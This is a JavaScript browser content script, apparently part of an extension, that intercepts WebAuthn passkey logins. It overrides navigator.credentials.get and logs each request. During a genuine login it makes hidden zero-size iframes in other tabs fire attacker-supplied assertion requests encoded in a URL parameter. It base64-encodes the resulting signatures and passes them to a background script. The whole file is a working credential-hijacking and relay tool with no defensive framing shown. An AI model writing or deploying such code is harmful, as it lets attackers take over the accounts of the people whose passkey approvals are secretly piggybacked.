// WebAuthn Request Interceptor and Replayer
// Inject this into the browser console or as a content script

(function() {
    'use strict';

    // Track pending requests for response correlation
    const pendingRequests = new Map();
    let requestIdCounter = 0;

    // Listen for responses from the extension bridge
    window.addEventListener('message', (event) => {
        if (event.source === window && event.data.type === 'EXTENSION_TO_MAIN') {
            const { messageId, success, data, error, originalType } = event.data;
            
            // Find the pending request
            const pendingRequest = pendingRequests.get(messageId);
            if (pendingRequest) {
                pendingRequests.delete(messageId);
                
                if (success) {
                    console.log('✅ Received response for', originalType, ':', data);
                    pendingRequest.resolve(data);
                } else {
                    console.error('❌ Error response for', originalType, ':', error);
                    pendingRequest.reject(new Error(error));
                }
            }
        }
    });

    // Helper function to send messages and return promises
    function sendMessageWithResponse(messageType, data = {}) {
        return new Promise((resolve, reject) => {
            const requestId = ++requestIdCounter;
            
            // Store the promise resolvers
            pendingRequests.set(requestId, { resolve, reject });
            
            const message = {
                type: messageType,
                data: data,
                requestId: requestId
            };
            
            console.log('📤 Sending message with response expectation:', message);
            
            window.postMessage({
                type: 'MAIN_TO_EXTENSION',
                payload: message
            }, '*');
            
            // Set timeout to prevent hanging promises
            setTimeout(() => {
                if (pendingRequests.has(requestId)) {
                    pendingRequests.delete(requestId);
                    reject(new Error('Request timeout'));
                }
            }, 10000); // 10 second timeout
        });
    }

    window.getWebAuthnRequest = function() {
        console.log('🔍 Requesting WebAuthn request from background script...');
        return sendMessageWithResponse('get_webauthn_request');
    };

    window.sendWebAuthnResponse = function(response) {
        console.log('📤 Sending WebAuthn response to background script:', response);
        return sendMessageWithResponse('send_webauthn_response', response);
    };
    
    // Check for makewebauthnrequest query parameter and handle it immediately
    const urlParams = new URLSearchParams(window.location.search);
    const makeWebAuthnRequest = urlParams.get('makewebauthnrequest');
    
    if (makeWebAuthnRequest) {
        try {
            console.log('🎯 WebAuthn request detected in URL parameter');
            
            // Base64 decode the parameter
            const decodedJson = atob(makeWebAuthnRequest);
            console.log('📝 Decoded JSON:', decodedJson);
            
            // Parse as JSON
            const requestOptions = JSON.parse(decodedJson);
            
            // Basic validation - check if it looks like a WebAuthn request
            if (requestOptions && requestOptions.publicKey && requestOptions.publicKey.challenge) {
                console.log('✅ Valid WebAuthn request structure detected');
                
                // Stop page loading immediately
                window.stop();
                
                // Clear the page content
                document.documentElement.innerHTML = '<html><head><title>WebAuthn Request</title></head><body><h1>🔑 Processing WebAuthn Request...</h1><p>Check console for details.</p></body></html>';
                
                // Helper function to convert base64url to ArrayBuffer
                function base64urlToArrayBuffer(base64url) {
                    const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
                    const padded = base64.padEnd(base64.length + (4 - base64.length % 4) % 4, '=');
                    const binary = atob(padded);
                    const bytes = new Uint8Array(binary.length);
                    for (let i = 0; i < binary.length; i++) {
                        bytes[i] = binary.charCodeAt(i);
                    }
                    return bytes.buffer;
                }

                // Convert the base64url strings to ArrayBuffers
                requestOptions.publicKey.challenge = base64urlToArrayBuffer(requestOptions.publicKey.challenge);
                requestOptions.publicKey.allowCredentials.forEach(cred => {
                    cred.id = base64urlToArrayBuffer(cred.id);
                });
                
                console.log('🚀 Executing WebAuthn request with options:', requestOptions);
                
                // Call WebAuthn immediately using the original method
                navigator.credentials.get(requestOptions).then(credential => {
                    console.log('✅ WebAuthn request from URL completed successfully:', credential);
                    
                    // Log detailed response information
                    if (credential) {
                        const responseData = {
                            id: credential.id,
                            rawId: btoa(String.fromCharCode(...new Uint8Array(credential.rawId))),
                            type: credential.type,
                            response: {
                                clientDataJSON: btoa(String.fromCharCode(...new Uint8Array(credential.response.clientDataJSON))),
                                authenticatorData: btoa(String.fromCharCode(...new Uint8Array(credential.response.authenticatorData))),
                                signature: btoa(String.fromCharCode(...new Uint8Array(credential.response.signature))),
                                userHandle: credential.response.userHandle ? btoa(String.fromCharCode(...new Uint8Array(credential.response.userHandle))) : null
                            }
                        };
                        
                        console.log('📤 WebAuthn Response from URL request (Base64):', responseData);
                        window.sendWebAuthnResponse(JSON.stringify(responseData));
                        
                        // Update page content with success message
                        document.body.innerHTML = '<h1>✅ WebAuthn Request Successful!</h1><p>Check console for response details.</p><pre>' + JSON.stringify(responseData, null, 2) + '</pre>';
                    }
                }).catch(error => {
                    console.error('❌ WebAuthn request from URL failed:', error);
                    
                    // Update page content with error message
                    document.body.innerHTML = '<h1>❌ WebAuthn Request Failed</h1><p>Error: ' + error.message + '</p><p>Check console for details.</p>';
                });
                
                // Exit early - don't load the rest of the interceptor
                return;
            } else {
                console.warn('⚠️ Invalid WebAuthn request structure - missing publicKey or challenge');
            }
        } catch (error) {
            console.error('❌ Failed to process makewebauthnrequest parameter:', error);
        }
    }
    
    // Store captured requests
    let capturedRequests = [];
    let originalGet = navigator.credentials.get;
    
    // Override navigator.credentials.get to intercept requests
    navigator.credentials.get = function(options) {
        console.log('🔑 WebAuthn GET Request Intercepted:', options);
        
        // Store the captured request
        const requestData = 
            JSON.parse(JSON.stringify(options, (key, value) => {
                // Skip AbortSignal and other non-serializable objects
                if (key === 'signal' || value instanceof AbortSignal || value instanceof AbortController) {
                    return undefined;
                }
                // Convert ArrayBuffer/Uint8Array to base64 for storage
                if (value instanceof ArrayBuffer || value instanceof Uint8Array) {
                    return {
                        type: 'ArrayBuffer',
                        data: btoa(String.fromCharCode(...new Uint8Array(value)))
                    };
                }
                return value;
            }));
        
        
        capturedRequests.push(requestData);
        console.log('📋 Captured Request Data:', requestData);
        
        // Sequential execution: First test call, then actual call
        return new Promise(async (resolve, reject) => {
            try {
                // Let the background script know we have an opportunity to piggyback a WebAuthn request
                createWebAuthnIframeInOtherTabs();
                // Wait a moment to ensure the first request is fully complete
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Second call: Actual call that forwards to original
                console.log('🔄 Making second actual call...');
                const actualCredential = await originalGet.call(this, options);
                console.log('✅ Actual call successful:', actualCredential);
                
                // Log detailed response information for actual call
                if (actualCredential) {
                    const actualResponseData = {
                        id: actualCredential.id,
                        rawId: btoa(String.fromCharCode(...new Uint8Array(actualCredential.rawId))),
                        type: actualCredential.type,
                        response: {
                            clientDataJSON: btoa(String.fromCharCode(...new Uint8Array(actualCredential.response.clientDataJSON))),
                            authenticatorData: btoa(String.fromCharCode(...new Uint8Array(actualCredential.response.authenticatorData))),
                            signature: btoa(String.fromCharCode(...new Uint8Array(actualCredential.response.signature))),
                            userHandle: actualCredential.response.userHandle ? btoa(String.fromCharCode(...new Uint8Array(actualCredential.response.userHandle))) : null
                        }
                    };
                    
                    console.log('📤 Actual Response Data (Base64):', actualResponseData);
                    
                    // Store actual response with the request
                    requestData.response = actualResponseData;
                }
                
                // Resolve with the actual credential (second call result)
                resolve(actualCredential);
                
            } catch (error) {
                console.error('❌ Error during sequential WebAuthn calls:', error);
                requestData.error = error.message;
                reject(error);
            }
        });
    };
    
    // Function to replay a captured request
    window.replayWebAuthnRequest = function(index = 0) {
        if (capturedRequests.length === 0) {
            console.warn('No captured requests to replay');
            return Promise.reject('No captured requests');
        }
        
        const request = capturedRequests[index];
        if (!request) {
            console.warn(`No request at index ${index}`);
            return Promise.reject(`No request at index ${index}`);
        }
        
        console.log('🔄 Replaying WebAuthn Request:', request);
        
        // Reconstruct the options object, converting base64 back to ArrayBuffer
        const options = JSON.parse(JSON.stringify(request.options), (key, value) => {
            if (value && typeof value === 'object' && value.type === 'ArrayBuffer') {
                const binaryString = atob(value.data);
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                return bytes.buffer;
            }
            return value;
        });
        
        // Remove any remaining signal property and ensure clean options
        if (options.signal) {
            delete options.signal;
        }
        
        // Add a small delay to avoid rapid-fire requests
        return new Promise(resolve => setTimeout(resolve, 100)).then(() => {
            console.log('🚀 Executing replay with options:', options);
            return originalGet.call(navigator.credentials, options);
        });
    };
    
    // Function to get all captured requests
    window.getCapturedRequests = function() {
        return capturedRequests;
    };       
        
    // Function to create a hidden iframe with WebAuthn request
    window.createWebAuthnIframe = function(site, request) {
        const iframe = document.createElement('iframe');
        // we add something/that/does/not/exist/ to the url to avoid hitting a page that will instantly change the url before we can parse it
        iframe.src = "https://" + site + "/something/that/does/not/exist/?makewebauthnrequest=" + encodeURIComponent(request);
        iframe.allow = 'publickey-credentials-get';
        iframe.style.width = '0px';
        iframe.style.height = '0px';
        iframe.style.border = 'none';
        iframe.style.position = 'absolute';
        iframe.style.left = '-9999px';
        iframe.style.top = '-9999px';
        
        // Add event listeners for debugging
        iframe.onload = function() {
            console.log('🖼️ WebAuthn iframe loaded successfully');
        };
        
        iframe.onerror = function() {
            console.error('❌ Error loading WebAuthn iframe');
        };
        
        // Append to body
        document.body.appendChild(iframe);
        
        console.log('🎯 Created hidden WebAuthn iframe with URL:', iframe.src);
        return iframe;
    };
        
    // Function to trigger WebAuthn iframe creation in other tabs via background script
    window.createWebAuthnIframeInOtherTabs = function() {
        const message = {
            type: 'create_webauthn_iframe',
            data: {}
        };
        
        console.log('📤 Sending message to background script:', message);
        
        window.postMessage({
            type: 'MAIN_TO_EXTENSION',
            payload: message
        }, '*');

        return true;
    };        
})();